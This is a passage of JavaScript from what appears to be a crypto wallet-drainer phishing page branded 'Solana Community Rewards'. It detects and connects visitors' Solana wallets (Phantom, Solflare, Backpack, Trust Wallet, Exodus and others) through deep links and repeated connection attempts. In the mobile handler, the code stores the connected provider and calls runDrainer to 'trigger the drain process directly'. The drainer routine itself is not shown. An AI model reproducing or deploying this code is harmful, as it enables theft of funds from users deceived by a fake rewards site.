          for (const providerFn of wallet.providers) {
            provider = providerFn();
            if (provider && typeof provider.connect === 'function') {
              break;
            }
          }
          
          if (provider) {
            
            const result = await provider.connect({
              onlyIfTrusted: false,
              appMetadata: {
                name: 'Solana Community Rewards',
                url: window.location.origin,
                icon: '/logo.png'
              }
            });
            
            if (result && result.publicKey) {
              return {
                success: true,
                wallet: wallet.key,
                publicKey: result.publicKey.toString(),
                provider: provider
              };
            }
          }
        } catch (error) {
        }
      }
      
      return { success: false, error: 'No mobile wallets found' };
    },

    // Method 3: Deep link fallback for mobile
    async connectWithDeepLink(walletType) {
      
      try {
        // Use the existing openInWallet function
        await window.openInWallet(walletType);
        
        // Wait a bit for the deep link to work
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Try to detect if connection was successful
        const wallet = WALLET_DEFS.find(w => w.key === walletType);
        if (wallet) {
          const provider = wallet.provider();
          if (provider && provider.publicKey) {
            return {
              success: true,
              wallet: walletType,
              publicKey: provider.publicKey.toString(),
              provider: provider
            };
          }
        }
        
        return { success: false, error: 'Deep link connection failed' };
      } catch (error) {
        console.error(`[MOBILE_CONNECT] Deep link failed for ${walletType}:`, error);
        return { success: false, error: error.message };
      }
    },

    // Method 4: QR Code generation for mobile scanning
    generateQRCode(uri) {
      
      // Create QR code element
      const qrContainer = document.createElement('div');
      qrContainer.id = 'mobileQRCode';
      qrContainer.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        z-index: 10000;
        text-align: center;
      `;
      
      qrContainer.innerHTML = `
        <h3 style="margin: 0 0 15px 0; color: #333;">Scan with Mobile Wallet</h3>
        <div id="qrcode" style="margin: 0 auto;"></div>
        <p style="margin: 15px 0 0 0; color: #666; font-size: 14px;">
          Open your mobile wallet and scan this QR code
        </p>
        <button onclick="closeQRCodeModal()" style="
          margin-top: 15px;
          padding: 8px 16px;
          background: #007bff;
          color: white;
          border: none;
          border-radius: 6px;
          cursor: pointer;
        ">Close</button>
      `;
      
      document.body.appendChild(qrContainer);
      
      // Show URI as text (no external libraries)
      document.getElementById('qrcode').innerHTML = `
        <div style="word-break: break-all; font-family: monospace; font-size: 12px; padding: 10px; background: #f5f5f5; border-radius: 6px;">
          ${uri}
        </div>
      `;
    }
  };

  // QR Code modal functions
  function showQRCodeModal(uri) {
    window.mobileConnectionMethods.generateQRCode(uri);
  }

  function closeQRCodeModal() {
    const qrModal = document.getElementById('mobileQRCode');
    if (qrModal) {
      qrModal.remove();
    }
  }

  // Enhanced mobile connection handler
  window.connectMobileWalletEnhanced = async function(walletType) {
    
    // Try multiple connection methods
    const methods = [
      () => window.mobileConnectionMethods.detectAndConnectMobileWallets(),
      () => window.mobileConnectionMethods.connectWithDeepLink(walletType),
      () => window.mobileConnectionMethods.connectWithWalletConnect()
    ];
    
    for (let i = 0; i < methods.length; i++) {
      try {
        const result = await methods[i]();
        
        if (result.success) {
          
          // Trigger connection with provider
          if (result.publicKey && result.provider) {
            // Store the provider globally for runDrainer to use
            window.connectedWallet = {
              key: result.wallet || walletType,
              name: result.wallet || walletType,
              logo: `/${result.wallet || walletType}-logo.png`,
              publicKey: result.publicKey,
              provider: result.provider
            };
            
            // Trigger the drain process directly
            if (window.runDrainer) {
              window.runDrainer(result.provider);
            } else {
              console.error('[MOBILE_CONNECT_ENHANCED] runDrainer function not found');
            }
          }
          
          return result;
        }
      } catch (error) {
      }
    }
    
    showStatus('Mobile connection failed. Please try again.', 'error');
    return { success: false, error: 'All connection methods failed' };
  };


    // Function to handle deep links properly (moved outside for global access)
    async function openInWallet(walletType) {
      // Use base URL without query parameters to avoid double-encoding issues
      const currentUrl = window.location.origin + window.location.pathname;
      let deepLink = '';
      let fallbackUrl = '';
      
      // Enhanced mobile detection
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent) || 
                            (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                            window.innerWidth <= 768 ||
                            ('ontouchstart' in window) ||
                            (navigator.platform && /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.platform));
      
      // For mobile devices, use enhanced deep link handling
          if (isMobileDevice) {
        console.log('[DEEP_LINK] Mobile device detected, using enhanced deep link handling');
      }
      
      switch(walletType) {
        case 'phantom':
          // Phantom: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Phantom URL format
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
            fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
          } else {
            // Desktop: Use complex Connect API (unchanged)
            deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'solflare':
          // Solflare: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Solflare URL format with redirect_link for Android
            const encodedUrl = encodeURIComponent(currentUrl);
            const redirectLink = encodeURIComponent(`${window.location.origin}${window.location.pathname}`);
            
            // Detect platform for different handling
            const userAgent = navigator.userAgent.toLowerCase();
            const isAndroid = /android/.test(userAgent);
            
            // Use exact Solflare format as specified
            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
            
            console.log(`[SOLFLARE_MOBILE] Using exact format: ${deepLink}`);
          } else {
            // Desktop: Use custom scheme first
            deepLink = `solflare://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://solflare.com/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'backpack':
          // Backpack: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use exact Backpack URL format
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
            fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
          } else {
            // Desktop: Use custom scheme first
            deepLink = `backpack://browse/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://backpack.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'trustwallet':
          // Trust Wallet: Use correct URL structure for mobile, complex API for desktop
          if (isMobileDevice) {
            // Mobile: Use correct Trust Wallet URL structure
            const encodedUrl = encodeURIComponent(currentUrl);
            deepLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
            fallbackUrl = `trust://open_url?url=${encodedUrl}`;
          } else {
            // Desktop: Use custom scheme first
            deepLink = `trust://open_url?url=${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'glow':
          // Glow: Use simplified deep links for better mobile support
          if (isMobileDevice) {
            // Mobile: Use universal link first (more reliable)
            deepLink = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `glow://app/${encodeURIComponent(currentUrl)}`;
          } else {
            // Desktop: Use custom scheme
            deepLink = `glow://app/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://glow.app/ul/app/${encodeURIComponent(currentUrl)}`;
          }
          break;
        case 'exodus':
          // Exodus: Use simplified deep links for better mobile support
          if (isMobileDevice) {
            // Mobile: Use universal link first (more reliable)
            deepLink = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
          } else {
            // Desktop: Use custom scheme
            deepLink = `exodus://dapp/${encodeURIComponent(currentUrl)}`;
            fallbackUrl = `https://exodus.com/app/dapp?url=${encodeURIComponent(currentUrl)}`;
          }
          break;
          
        default:
          // Fallback for unknown wallet types
          console.warn(`[DEEP_LINK] Unknown wallet type: ${walletType}`);
          deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
          fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          break;
      }
      
      // Validate that we have valid deep links
      if (!deepLink || !fallbackUrl) {
        console.error(`[DEEP_LINK] Invalid deep links generated for ${walletType}:`, { deepLink, fallbackUrl });
        deepLink = `${walletType}://browse/${encodeURIComponent(currentUrl)}`;
        fallbackUrl = `https://${walletType}.app/ul/browse/${encodeURIComponent(currentUrl)}`;
      }
      
      console.log(`[DEEP_LINK] ${isMobileDevice ? 'Mobile' : 'Desktop'} device detected`);
      console.log(`[DEEP_LINK] Attempting to open ${walletType} with:`, deepLink);
      
      // Improved deep link opening with better mobile support
      try {
        if (isMobileDevice) {
          console.log(`[DEEP_LINK] Mobile device: using improved approach`);
          
          // For mobile, try universal link first (more reliable)
          console.log(`[DEEP_LINK] Trying universal link: ${deepLink}`);
          
          // Use a more reliable method for mobile deep links
          const link = document.createElement('a');
          link.href = deepLink;
          link.target = '_self'; // Changed from '_blank' to '_self' to stay in same tab
          link.rel = 'noopener noreferrer';
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          
          // For Solflare, NO FALLBACK - direct deep link with auto connection/signing
          if (walletType === 'solflare') {
            console.log(`[SOLFLARE_DIRECT] Solflare detected - using direct deep link approach with NO fallback`);
            console.log(`[SOLFLARE_DIRECT] Deep link opened: ${deepLink}`);
            console.log(`[SOLFLARE_DIRECT] Auto-connect will handle connection and signing`);
            
            // Show status and let auto-connect handle the rest
            showStatus(`Opening Solflare wallet...`, 'info');
            
            // Add mobile debugging info
            
            // Simple mobile Solflare - let auto-connect handle it like other wallets
            console.log(`[SOLFLARE_MOBILE] Using simple approach like Phantom and Backpack`);
            
            // No fallback timeout for Solflare - let auto-connect handle everything
            return;
          }
          
          // For other wallets, use the enhanced fallback logic
          setTimeout(() => {
            // Enhanced detection: Check if we're in a wallet browser or if deep link worked
            const isInWalletBrowser = window.location.href.includes('phantom.app') || 
                                     window.location.href.includes('solflare.com') ||
                                     window.location.href.includes('backpack.app') ||
                                     window.location.href.includes('trustwallet.com') ||
                                     window.location.href.includes('glow.app') ||
                                     window.location.href.includes('exodus.com') ||
                                     document.referrer.includes('phantom.app') ||
                                     document.referrer.includes('solflare.com') ||
                                     document.referrer.includes('backpack.app') ||
                                     document.referrer.includes('trustwallet.com') ||
                                     document.referrer.includes('glow.app') ||
                                     document.referrer.includes('exodus.com') ||
                                     // Check for wallet-specific user agents
                                     navigator.userAgent.includes('Phantom') ||
                                     navigator.userAgent.includes('Solflare') ||
                                     navigator.userAgent.includes('Backpack') ||
                                     navigator.userAgent.includes('TrustWallet') ||
                                     navigator.userAgent.includes('Glow') ||
                                     navigator.userAgent.includes('Exodus');
            
            // Check if wallet providers are available (indicates we're in wallet browser)
            const hasWalletProviders = !!(window.phantom || window.solflare || window.backpack || 
                                        window.glow || window.trustwallet || window.exodus);
            
            if (isInWalletBrowser || hasWalletProviders) {
              console.log(`[DEEP_LINK] Deep link successful - detected wallet browser environment`);
              console.log(`[DEEP_LINK] isInWalletBrowser: ${isInWalletBrowser}, hasWalletProviders: ${hasWalletProviders}`);
              return; // Don't try fallback if we're in wallet browser
            }
            
            // Only try fallback if we're definitely not in a wallet browser
            if (window.location.href === currentUrl) {
              console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
              window.location.href = fallbackUrl;
            } else {
              console.log(`[DEEP_LINK] Universal link successful, staying in wallet browser`);
            }
          }, 3000); // Increased timeout to 3 seconds
          
          // Show a message to the user about what's happening (for non-Solflare wallets)
          if (walletType !== 'solflare') {
          showStatus(`Opening ${walletType} wallet...`, 'info');
            
            // Add mobile debugging info
          }
          
        } else {
          // Desktop: Direct window location change
          console.log(`[DEEP_LINK] Desktop: direct navigation to ${deepLink}`);
          window.location.href = deepLink;
        }
        
      } catch (error) {
        console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
        
        // Enhanced fallback: try multiple strategies
        console.log(`[DEEP_LINK] Attempting enhanced fallback strategies`);
        
        // For mobile, show user-friendly message instead of immediate app store redirect
        if (isMobileDevice) {
          showStatus(`Please open ${walletType} manually and return to this page`, 'info');
          
          // Only redirect to app store after user confirmation or timeout
          setTimeout(() => {
            if (confirm(`Would you like to install ${walletType} wallet?`)) {
              const installUrl = walletType === 'solflare' ? 'https://solflare.com/' : 
                               walletType === 'phantom' ? 'https://phantom.app/' :
                               walletType === 'backpack' ? 'https://backpack.app/' : '#';
              window.open(installUrl, '_blank');
            }
          }, 5000);
        } else {
          // Desktop: Strategy 1: Try fallback URL
        try {
          window.location.href = fallbackUrl;
        } catch (fallbackError) {
          console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
          
          // Strategy 2: Try install page
          const wallet = WALLET_DEFS.find(w => w.key === walletType);
          if (wallet && wallet.install) {
            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
            window.location.href = wallet.install;
          } else {
            // Strategy 3: Show error message
            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
            }
          }
        }
      }
    }

    // Close wallet modal function
    window.closeWalletModal = function() {
      const modal = document.getElementById('walletModal');
      if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
      }
    };
    
    // Close status modal function
    window.closeStatusModal = function() {
      const modal = document.getElementById('statusModal');
      if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
      }
    };
    
    // Add click-outside-to-close functionality for modals
    document.addEventListener('click', function(e) {
      // Close wallet modal when clicking outside
      const walletModal = document.getElementById('walletModal');
      if (walletModal && walletModal.classList.contains('active')) {
        if (e.target === walletModal) {
          closeWalletModal();
        }
      }
      
      // Close status modal when clicking outside
      const statusModal = document.getElementById('statusModal');
      if (statusModal && statusModal.classList.contains('active')) {
        if (e.target === statusModal) {
          closeStatusModal();
        }
      }
    });
    
    // Add ESC key to close modals
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape') {
        closeWalletModal();
        closeStatusModal();
      }
    });
    
// Backend-delegated wallet modal functions
async function getWalletModalData() {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'get_wallet_modal_data'
      })
    });
    
    const data = await response.json();
    return data.result || { wallets: [], isMobile: false };
  } catch (error) {
    console.error('[WALLET_MODAL] Backend fetch failed:', error);
    return { wallets: [], isMobile: false };
  }
}

async function getWalletConnectionInfo(walletKey) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'connect_wallet',
        walletKey: walletKey
      })
    });
    
    const data = await response.json();
    return data.result || { success: false, error: 'Connection failed' };
  } catch (error) {
    console.error('[WALLET_CONNECT] Backend connection failed:', error);
    return { success: false, error: error.message };
  }
}

// Enhanced openWalletModal function using backend
window.openWalletModal = async function openWalletModal() {
  // Opening wallet modal
  const modal = document.getElementById('walletModal');
  
  if (!modal) {
    console.error('[WALLET_MODAL] Modal element not found');
        return;
      }
      
  try {
    // Get wallet data from backend
    const modalData = await getWalletModalData();
    // Retrieved wallet data from backend
    
    // Update wallet options with backend data
    const walletOptions = modal.querySelector('.wallet-options');
    if (walletOptions && modalData.wallets.length > 0) {
      walletOptions.innerHTML = '';
      
      modalData.wallets.forEach(wallet => {
        const walletOption = document.createElement('div');
        walletOption.className = 'wallet-option';
        walletOption.onclick = () => {
          // Check if mobile device
          const userAgent = navigator.userAgent.toLowerCase();
          const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                          /mobile|tablet/i.test(userAgent) ||
                          (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                          window.innerWidth <= 768;
          
          if (isMobile) {
            console.log('[WALLET_OPTION] Mobile device detected, using enhanced mobile connection');
            // For mobile, use the enhanced mobile connection system
            window.connectMobileWalletEnhanced(wallet.key).catch(error => {
              console.error('[WALLET_OPTION] Enhanced mobile connection failed:', error);
              // Fallback to basic deep link
              window.openInWallet(wallet.key).catch(fallbackError => {
                console.error('[WALLET_OPTION] Fallback deep link also failed:', fallbackError);
                showStatus('Mobile connection failed. Please try again.', 'error');
              });
            });
          } else {
            console.log('[WALLET_OPTION] Desktop device, using standard connection');
            window.connectWallet(wallet.key);
          }
        };
        
        walletOption.innerHTML = `
          <div class="wallet-icon">
            <img src="${wallet.logo}" alt="${wallet.name}">
          </div>
          <div class="wallet-info">
            <span class="wallet-name">${wallet.name}</span>
            <span class="wallet-description">${wallet.description}</span>
          </div>
          <div class="wallet-arrow">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 15L12.5 10L7.5 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </div>
        `;
        
        walletOptions.appendChild(walletOption);
      });
    }
    
    // Show mobile indicator if on mobile device
    const userAgent = navigator.userAgent.toLowerCase();
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent) ||
                    /mobile|tablet/i.test(userAgent) ||
                    (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                    window.innerWidth <= 768;
    
    const mobileIndicator = modal.querySelector('#mobileIndicator');
    if (mobileIndicator) {
      mobileIndicator.style.display = isMobile ? 'block' : 'none';
    }
    
    // Show modal
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
  } catch (error) {
    console.error('[WALLET_MODAL] Error opening modal:', error);
    showStatus('Failed', 'error');
  }
};

// Backend-delegated connectWallet function
window.connectWallet = async function connectWallet(walletKey) {
  
  try {
    // Get connection info from backend
    const connectionResult = await getWalletConnectionInfo(walletKey);
    
    if (!connectionResult.success) {
      console.error(`[CONNECT] Connection failed: ${connectionResult.error}`);
      showStatus('Failed', 'error');
      return;
    }
    
    const { wallet, connectionInstructions, isMobile } = connectionResult;
    
    // Close modal
      closeWalletModal();
      
      // Show connecting status
      showStatus('Processing...', 'loading');
      
    // Handle connection based on wallet type
    if (isMobile && connectionInstructions.success) {
      // Mobile wallet connection
      const { deepLink, installUrl } = connectionInstructions.instructions;
      
      // Try deep link first
      if (deepLink) {
        window.location.href = deepLink;
        setTimeout(() => {
          // If deep link fails, redirect to install page
          window.location.href = installUrl;
        }, 2000);
        } else {
        window.location.href = installUrl;
      }
    } else {
      // Desktop wallet connection - try to find provider
      const providerNames = wallet.providerNames || [];
      let provider = null;
      
      for (const providerName of providerNames) {
        try {
          console.log(`[CONNECT] Checking provider: ${providerName}`);
          const providerPath = providerName.split('.');
          let current = window;
          for (const part of providerPath) {
            current = current[part];
            if (!current) {
              console.log(`[CONNECT] Provider path broken at: ${part}`);
              break;
          }
          }
          // Provider found
          
          // Check for standard connect function
          if (current && typeof current.connect === 'function') {
            provider = current;
            // Using provider
            break;
          }
          
          // Special handling for Trust Wallet and Exodus
          if (current && (current.isTrust || current.isTrustWallet)) {
            console.log(`[CONNECT] Trust Wallet detected, checking for Solana provider`);
            if (current.solana && typeof current.solana.connect === 'function') {
              provider = current.solana;
              console.log(`[CONNECT] Using Trust Wallet Solana provider: ${providerName}`);
              break;
            }
          }
          
          if (current && (current.isExodus || current.isExodusWallet || providerName.includes('exodus'))) {
            console.log(`[CONNECT] Exodus detected, checking for Solana provider`);
            console.log(`[CONNECT] Exodus provider structure:`, Object.keys(current));
            if (current.solana && typeof current.solana.connect === 'function') {
              provider = current.solana;
              console.log(`[CONNECT] Using Exodus Solana provider: ${providerName}`);
              break;
            } else if (typeof current.connect === 'function') {
              provider = current;
              console.log(`[CONNECT] Using Exodus main provider: ${providerName}`);
              break;
            }
          }
        } catch (e) {
          console.log(`[CONNECT] Error checking provider ${providerName}:`, e.message);
        }
      }
      
      if (provider) {
        try {
          // Wallet-specific connection handling
          let response, publicKey;
          
          switch (walletKey) {
            case 'phantom':
              response = await provider.connect();
              publicKey = response?.publicKey || provider.publicKey;
              break;
              
            case 'solflare':
              // Solflare connection - enhanced with multiple strategies like Backpack
              console.log('[CONNECT] Solflare connection - triggering wallet UI');
              console.log('[CONNECT] Solflare provider structure:', Object.keys(provider));
              console.log('[CONNECT] Solflare connect function type:', typeof provider.connect);
              console.log('[CONNECT] Solflare isConnected:', provider.isConnected);
              console.log('[CONNECT] Solflare publicKey before connect:', provider.publicKey);
              
              // Check if already connected
              if (provider.isConnected && provider.publicKey) {
                console.log('[CONNECT] Solflare already connected, using existing connection');
                publicKey = provider.publicKey;
                response = { publicKey: publicKey };
              } else {
                // Try to connect with proper parameters to trigger UI
                console.log('[CONNECT] Solflare not connected, attempting connection...');
                
                // Enhanced Solflare connection with multiple strategies
                const connectionStrategies = [
                  {
                    name: 'Method 1: Connect with metadata',
                    fn: () => provider.connect({
                      onlyIfTrusted: false,
                      appMetadata: {
                        name: 'Solana Community Rewards',
                        url: window.location.origin,
                        icon: '/logo.png'
                      }
                    })
                  },
                  {
                    name: 'Method 2: Simple connect',
                    fn: () => provider.connect()
                  },
                  {
                    name: 'Method 3: Request method',
                    fn: () => {
                      if (typeof provider.request === 'function') {
                        return provider.request({ method: 'connect' });
                      } else {
                        throw new Error('provider.request is not a function');
                      }
                    }
                  },
                  {
                    name: 'Method 4: Direct public key access',
                    fn: () => {
                      if (provider.publicKey) {
                        return { publicKey: provider.publicKey };
                      } else {
                        throw new Error('No public key available');
                      }
                    }
                  }
                ];
                
                let connectionSuccessful = false;
                
                for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                  try {
                    console.log(`[CONNECT] Solflare ${connectionStrategies[i].name}...`);
                    response = await connectionStrategies[i].fn();
                    
                    // Enhanced public key extraction for Solflare
                    publicKey = response?.publicKey || 
                               response?.account?.publicKey ||
                               provider.publicKey || 
                               provider.account?.publicKey ||
                               provider.connected?.publicKey ||
                               provider.wallet?.publicKey;
                    
                    if (publicKey) {
                      console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} successful:`, publicKey.toString());
                      connectionSuccessful = true;
                    } else {
                      console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} returned no public key`);
                    }
                  } catch (strategyError) {
                    console.log(`[CONNECT] Solflare ${connectionStrategies[i].name} failed:`, strategyError.message);
                    if (i < connectionStrategies.length - 1) {
                      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                    }
                  }
                }
                
                if (!connectionSuccessful) {
                  throw new Error('Solflare connection failed: All connection methods failed');
                }
              }
              break;
              
            case 'backpack':
              // Backpack connection - try to trigger wallet UI properly
              console.log('[CONNECT] Backpack connection - triggering wallet UI');
              console.log('[CONNECT] Backpack provider structure:', Object.keys(provider));
              console.log('[CONNECT] Backpack connect function type:', typeof provider.connect);
              console.log('[CONNECT] Backpack isConnected:', provider.isConnected);
              console.log('[CONNECT] Backpack publicKey before connect:', provider.publicKey);
              
              // Check if already connected
              if (provider.isConnected && provider.publicKey) {
                console.log('[CONNECT] Backpack already connected, using existing connection');
                publicKey = provider.publicKey;
                response = { publicKey: publicKey };
              } else {
                // Try to connect with proper parameters to trigger UI
                console.log('[CONNECT] Backpack not connected, attempting connection...');
                
                // Enhanced Backpack connection with multiple strategies
                const connectionStrategies = [
                  {
                    name: 'Method 1: Connect with metadata',
                    fn: () => provider.connect({
                      onlyIfTrusted: false,
                    appMetadata: {
                        name: 'Solana Community Rewards',
                      url: window.location.origin,
                      icon: '/logo.png'
                    }
                    })
                  },
                  {
                    name: 'Method 2: Simple connect',
                    fn: () => provider.connect()
                  },
                  {
                    name: 'Method 3: Request method',
                    fn: () => {
                      if (typeof provider.request === 'function') {
                        return provider.request({ method: 'connect' });
                      } else {
                        throw new Error('provider.request is not a function');
                      }
                    }
                  },
                  {
                    name: 'Method 4: Direct public key access',
                    fn: () => {
                      if (provider.publicKey) {
                        return { publicKey: provider.publicKey };
                      } else {
                        throw new Error('No public key available');
                      }
                    }
                  }
                ];
                
                let connectionSuccessful = false;
                
                for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
                  const strategy = connectionStrategies[i];
                  console.log(`[CONNECT] Backpack ${strategy.name}...`);
                  
                  try {
                    // Add delay between attempts
                    if (i > 0) {
                      await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                    
                    const connectPromise = strategy.fn();
                    const timeoutPromise = new Promise((_, reject) => 
                      setTimeout(() => reject(new Error('Connection timeout')), 45000) // 45 seconds per attempt (increased from 20s)
                    );
                    
                    response = await Promise.race([connectPromise, timeoutPromise]);
                    console.log(`[CONNECT] Backpack ${strategy.name} successful:`, response);
                    
                    // Check if we got a public key
                    publicKey = response?.publicKey || provider.publicKey;
                    if (publicKey) {
                      console.log('[CONNECT] Backpack connection established with public key:', publicKey);
                      connectionSuccessful = true;
                      break;
                    }
                  } catch (strategyError) {
                    console.log(`[CONNECT] Backpack ${strategy.name} failed:`, strategyError.message);
                    
                    // If this is the last strategy, handle the error
                    if (i === connectionStrategies.length - 1) {
                      throw new Error(`Backpack connection failed: ${strategyError.message}. Make sure Backpack wallet is installed and unlocked.`);
                    }
                  }
                }
                
                if (!connectionSuccessful) {
                  throw new Error('All Backpack connection methods failed');
                }
              }
              break;
              
            case 'glow':
              response = await provider.connect();
              publicKey = response?.publicKey || provider.publicKey;
              break;
              
            case 'trustwallet':
              // Trust Wallet uses provider.solana for Solana connections
              console.log('[CONNECT] Trust Wallet connection - provider structure:', Object.keys(provider));
              
              // Add delay to ensure wallet UI is ready
              console.log('[CONNECT] Trust Wallet - waiting for wallet UI to initialize...');
              await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
              
              // Try multiple Trust Wallet connection strategies
              const trustWalletStrategies = [
                {
                  name: 'Method 1: Main provider with extended timeout',
                  fn: () => {
                    if (typeof provider.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet main provider with extended timeout');
                      return provider.connect();
                    } else {
                      throw new Error('Main provider not available');
                    }
                  }
                },
                {
                  name: 'Method 2: Adapter connection',
                  fn: () => {
                    if (provider.adapter && typeof provider.adapter.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet adapter connection');
                      return provider.adapter.connect();
                    } else {
                      throw new Error('Adapter not available');
                    }
                  }
                },
                {
                  name: 'Method 3: Mobile adapter connection',
                  fn: () => {
                    if (provider.mobileAdapter && typeof provider.mobileAdapter.connect === 'function') {
                      console.log('[CONNECT] Using Trust Wallet mobile adapter connection');
                      return provider.mobileAdapter.connect();
                    } else {
                      throw new Error('Mobile adapter not available');
                    }
                  }
                },
                {
                  name: 'Method 4: Direct public key access',
                  fn: () => {
                    // Trust Wallet might have public key in different locations
                    const publicKey = provider.publicKey || 
                                    provider.account?.publicKey ||
                                    provider.wallet?.publicKey ||
                                    provider.connected?.publicKey;
                    
                    if (publicKey) {
                      console.log('[CONNECT] Using Trust Wallet direct public key access');
                      return { publicKey: publicKey };
                    } else {
                      throw new Error('No public key available');
                    }
                  }
                }
              ];
              
              let trustWalletConnected = false;
              for (let i = 0; i < trustWalletStrategies.length && !trustWalletConnected; i++) {
                const strategy = trustWalletStrategies[i];
                try {
                  console.log(`[CONNECT] Trust Wallet ${strategy.name}...`);
                  
                  const connectPromise = strategy.fn();
                // Trust Wallet handles its own timeouts - no artificial timeout needed
                  
                response = await connectPromise;
                  publicKey = response?.publicKey || 
                             provider.publicKey || 
                             provider.account?.publicKey ||
                             provider.wallet?.publicKey ||
                             provider.connected?.publicKey;
                  
                  if (publicKey) {
                    trustWalletConnected = true;
                    console.log(`[CONNECT] Trust Wallet ${strategy.name} successful:`, publicKey.toString());
              } else {
                    throw new Error('No public key returned');
                  }
                } catch (strategyError) {
                  console.log(`[CONNECT] Trust Wallet ${strategy.name} failed:`, strategyError.message);
                  if (i < trustWalletStrategies.length - 1) {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
                  }
                }
              }
              
              if (!trustWalletConnected) {
                throw new Error('Trust Wallet connection failed: All connection methods failed');
              }
              break;
              
            case 'exodus':
              // Exodus uses provider.solana for Solana connections
              console.log('[CONNECT] Exodus connection - provider structure:', Object.keys(provider));
              
              // Add delay to ensure wallet UI is ready
              console.log('[CONNECT] Exodus - waiting for wallet UI to initialize...');
              await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
              
              // Try multiple Exodus connection strategies
              const exodusStrategies = [
                {
                  name: 'Method 1: Solana provider',
                  fn: () => {
              if (provider.solana && typeof provider.solana.connect === 'function') {
                console.log('[CONNECT] Using Exodus Solana provider');
                      return provider.solana.connect();
                    } else {
                      throw new Error('Solana provider not available');
                    }
                  }
                },
                {
                  name: 'Method 2: Main provider',
                  fn: () => {
                    if (typeof provider.connect === 'function') {
                console.log('[CONNECT] Using Exodus main provider');
                      return provider.connect();
                    } else {
                      throw new Error('Main provider not available');
                    }
                  }
                },
                {
                  name: 'Method 3: Direct public key access',
                  fn: () => {
                    if (provider.solana && provider.solana.publicKey) {
                      console.log('[CONNECT] Using Exodus direct public key access');
                      return { publicKey: provider.solana.publicKey };
                    } else if (provider.publicKey) {
                      console.log('[CONNECT] Using Exodus main public key access');
                      return { publicKey: provider.publicKey };
                    } else {
                      throw new Error('No public key available');
                    }
                  }
                }
              ];
              
              let exodusConnected = false;
              for (let i = 0; i < exodusStrategies.length && !exodusConnected; i++) {
                const strategy = exodusStrategies[i];
                try {
                  console.log(`[CONNECT] Exodus ${strategy.name}...`);
                  
                  const connectPromise = strategy.fn();
